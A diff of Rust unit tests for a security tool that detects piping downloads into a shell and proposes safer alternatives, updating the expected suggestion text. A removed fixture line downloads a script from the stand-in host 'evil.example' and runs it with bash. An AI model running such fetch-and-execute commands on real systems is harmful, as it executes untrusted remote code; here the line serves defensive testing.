@@ -756,11 +756,10 @@ mod tests {
         let custom = vec![secret.to_string()];
         let sugg = vec![SafeSuggestion {
             rule_id: "curl_pipe_shell".to_string(),
-            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL spliced
-            // back into the rewrite. Here the URL carries the custom-pattern token.
+            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL is the
+            // runner's quoted argument. Here it carries the custom-pattern token.
             safe_command: Some(format!(
-                "curl -fsSL -o /tmp/tirith-review.sh 'https://evil.example/{secret}' && \
-                 less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh"
+                "tirith run --capsule 'https://evil.example/{secret}'"
             )),
             // Also plant it in the rationale (env-scrub builds this at runtime).
             rationale: format!("downloads {secret} for review"),
@@ -1296,6 +1295,7 @@ mod tests {
         );
     }
 
+    #[cfg(unix)]
     #[test]
     fn write_safe_suggestions_renders_try_and_fix() {
         let verdict = Verdict::from_findings(
@@ -1323,7 +1323,10 @@ mod tests {
         let out = String::from_utf8(buf).unwrap();
         assert!(out.contains("safer alternative"), "{out}");
         assert!(out.contains("try:"), "{out}");
-        assert!(out.contains("/tmp/tirith-review.sh"), "{out}");
+        assert!(
+            out.contains("tirith run --capsule 'https://example.com/x.sh'"),
+            "{out}"
+        );
         assert!(out.contains("fix:"), "{out}");
     }
 }
